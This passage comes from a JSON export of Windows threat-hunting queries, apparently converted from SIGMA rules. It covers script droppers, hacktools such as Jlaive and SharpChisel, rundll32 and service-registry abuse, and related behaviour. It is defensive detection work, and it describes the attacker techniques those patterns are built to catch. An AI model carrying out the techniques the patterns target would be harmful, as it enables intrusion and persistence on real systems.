            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects wscript/cscript executions of scripts located in user directories",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1059"
            ],
            "name": "Potential Dropper Script Execution Via WScript/CScript",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\wscript.exe\" or tgt.process.image.path contains \"\\cscript.exe\") and (tgt.process.cmdline contains \":\\Temp\\\" or tgt.process.cmdline contains \":\\Tmp\\\" or tgt.process.cmdline contains \":\\Users\\Public\\\" or tgt.process.cmdline contains \":\\Windows\\Temp\\\" or tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\\") and (tgt.process.cmdline contains \".js\" or tgt.process.cmdline contains \".jse\" or tgt.process.cmdline contains \".vba\" or tgt.process.cmdline contains \".vbe\" or tgt.process.cmdline contains \".vbs\" or tgt.process.cmdline contains \".wsf\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 444
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious parent processes that should not have any children or should only have a single possible child program",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036"
            ],
            "name": "Suspicious Process Parents",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\minesweeper.exe\" or src.process.image.path contains \"\\winver.exe\" or src.process.image.path contains \"\\bitsadmin.exe\") or ((src.process.image.path contains \"\\csrss.exe\" or src.process.image.path contains \"\\certutil.exe\" or src.process.image.path contains \"\\eventvwr.exe\" or src.process.image.path contains \"\\calc.exe\" or src.process.image.path contains \"\\notepad.exe\") and (not ((tgt.process.image.path contains \"\\WerFault.exe\" or tgt.process.image.path contains \"\\wermgr.exe\" or tgt.process.image.path contains \"\\conhost.exe\" or tgt.process.image.path contains \"\\mmc.exe\" or tgt.process.image.path contains \"\\win32calc.exe\" or tgt.process.image.path contains \"\\notepad.exe\") or not (tgt.process.image.path matches \"\\.*\"))))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 445
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the use of Jlaive to execute assemblies in a copied PowerShell",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "HackTool - Jlaive In-Memory Assembly Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\cmd.exe\" and src.process.cmdline contains \".bat\") and ((tgt.process.image.path contains \"\\xcopy.exe\" and (tgt.process.cmdline contains \"powershell.exe\" and tgt.process.cmdline contains \".bat.exe\")) or (tgt.process.image.path contains \"\\xcopy.exe\" and (tgt.process.cmdline contains \"pwsh.exe\" and tgt.process.cmdline contains \".bat.exe\")) or (tgt.process.image.path contains \"\\attrib.exe\" and (tgt.process.cmdline contains \"+s\" and tgt.process.cmdline contains \"+h\" and tgt.process.cmdline contains \".bat.exe\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 446
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "setupapi.dll library provide InstallHinfSection function for processing INF files. INF file may contain instructions allowing to create values in the registry, modify files and install drivers. This technique could be used to obtain persistence via modifying one of Run or RunOnce registry keys, run process or use other DLLs chain calls (see references) InstallHinfSection function in setupapi.dll calls runonce.exe executable regardless of actual content of INF file.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Suspicious Rundll32 Setupapi.dll Activity",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\runonce.exe\" and src.process.image.path contains \"\\rundll32.exe\" and (src.process.cmdline contains \"setupapi.dll\" and src.process.cmdline contains \"InstallHinfSection\"))) | columns ComputerName,tgt.process.user,tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 447
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious Splwow64.exe process without any command line parameters",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1202"
            ],
            "name": "Suspicious Splwow64 Without Params",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\splwow64.exe\" and tgt.process.cmdline contains \"splwow64.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 448
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects changes to the \"DisableRestrictedAdmin\" registry value in order to disable or enable RestrictedAdmin mode.\nRestrictedAdmin mode prevents the transmission of reusable credentials to the remote system to which you connect using Remote Desktop.\nThis prevents your credentials from being harvested during the initial connection process if the remote server has been compromise\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1112"
            ],
            "name": "RestrictedAdminMode Registry Value Tampering - ProcCreation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"\\System\\CurrentControlSet\\Control\\Lsa\\\" and tgt.process.cmdline contains \"DisableRestrictedAdmin\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 449
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious child processes of \"BgInfo.exe\" which could be a sign of potential abuse of the binary to proxy execution via external VBScript",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059",
                "t1218",
                "t1202"
            ],
            "name": "Suspicious Child Process Of BgInfo.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\bginfo.exe\" or src.process.image.path contains \"\\bginfo64.exe\") and ((tgt.process.image.path contains \"\\calc.exe\" or tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\notepad.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\wscript.exe\") or (tgt.process.image.path contains \"\\AppData\\Local\\\" or tgt.process.image.path contains \"\\AppData\\Roaming\\\" or tgt.process.image.path contains \":\\Users\\Public\\\" or tgt.process.image.path contains \":\\Temp\\\" or tgt.process.image.path contains \":\\Windows\\Temp\\\" or tgt.process.image.path contains \":\\PerfLogs\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 450
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of Gpg4win to encrypt files",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [],
            "name": "File Encryption Using Gpg4win",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (((tgt.process.image.path contains \"\\gpg.exe\" or tgt.process.image.path contains \"\\gpg2.exe\") or tgt.process.displayName=\"GnuPG\u2019s OpenPGP tool\") and (tgt.process.cmdline contains \" -c \" and tgt.process.cmdline contains \"passphrase\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 451
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Use of hostname to get information",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1082"
            ],
            "name": "Suspicious Execution of Hostname",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and tgt.process.image.path contains \"\\HOSTNAME.EXE\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 452
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the creation of scheduled tasks that involves a temporary folder and runs only once",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053"
            ],
            "name": "Suspicious Scheduled Task Creation Involving Temp Folder",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\schtasks.exe\" and (tgt.process.cmdline contains \" /create \" and tgt.process.cmdline contains \" /sc once \" and tgt.process.cmdline contains \"\\Temp\\\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 453
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects uncommon child processes of \"DefaultPack.EXE\" binary as a proxy to launch other programs",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Uncommon Child Process Of Defaultpack.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\DefaultPack.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 454
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious Windows Error Reporting manager (wermgr.exe) child process",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1055",
                "t1036"
            ],
            "name": "Suspicious Child Process Of Wermgr.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((src.process.image.path contains \"\\wermgr.exe\" and (tgt.process.image.path contains \"\\cmd.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\ipconfig.exe\" or tgt.process.image.path contains \"\\mshta.exe\" or tgt.process.image.path contains \"\\net.exe\" or tgt.process.image.path contains \"\\net1.exe\" or tgt.process.image.path contains \"\\netstat.exe\" or tgt.process.image.path contains \"\\nslookup.exe\" or tgt.process.image.path contains \"\\powershell_ise.exe\" or tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\systeminfo.exe\" or tgt.process.image.path contains \"\\whoami.exe\" or tgt.process.image.path contains \"\\wscript.exe\")) and (not (tgt.process.image.path contains \"\\rundll32.exe\" and (tgt.process.cmdline contains \"C:\\Windows\\system32\\WerConCpl.dll\" and tgt.process.cmdline contains \"LaunchErcApp \") and (tgt.process.cmdline contains \"-queuereporting\" or tgt.process.cmdline contains \"-responsepester\")))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 455
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Deployment Image Servicing and Management tool. DISM is used to enumerate, install, uninstall, configure, and update features and packages in Windows images",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1562"
            ],
            "name": "Dism Remove Online Package",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\DismHost.exe\" and (src.process.cmdline contains \"/Online\" and src.process.cmdline contains \"/Disable-Feature\")) or (tgt.process.image.path contains \"\\Dism.exe\" and (tgt.process.cmdline contains \"/Online\" and tgt.process.cmdline contains \"/Disable-Feature\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 456
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries can carry out malicious operations using a virtual instance to avoid detection. This rule is built to detect the registration of the Virtualbox driver or start of a Virtualbox VM.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1564",
                "t1564"
            ],
            "name": "Detect Virtualbox Driver Installation OR Starting Of VMs",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"VBoxRT.dll,RTR3Init\" or tgt.process.cmdline contains \"VBoxC.dll\" or tgt.process.cmdline contains \"VBoxDrv.sys\") or (tgt.process.cmdline contains \"startvm\" or tgt.process.cmdline contains \"controlvm\"))) | columns ComputerName,tgt.process.user,tgt.process.cmdline,src.process.cmdline",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 457
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects usage of the Sharp Chisel via the commandline arguments",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1090"
            ],
            "name": "HackTool - SharpChisel Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\SharpChisel.exe\" or tgt.process.displayName=\"SharpChisel\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 458
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detect modification of services configuration (ImagePath, FailureCommand and ServiceDLL) in registry by processes with Medium integrity level",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1574"
            ],
            "name": "Potential Privilege Escalation via Service Permissions Weakness",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.integrityLevel in (\"Medium\",\"S-1-16-8192\")) and (tgt.process.cmdline contains \"ControlSet\" and tgt.process.cmdline contains \"services\") and (tgt.process.cmdline contains \"\\ImagePath\" or tgt.process.cmdline contains \"\\FailureCommand\" or tgt.process.cmdline contains \"\\ServiceDll\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 459
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services.\nAdversaries may use flaws in the permissions for registry to redirect from the originally specified executable to one that they control, in order to launch their own code at Service start.\nWindows stores local service configuration information in the Registry under HKLM\\SYSTEM\\CurrentControlSet\\Services\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1574"
            ],
            "name": "Changing Existing Service ImagePath Value Via Reg.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
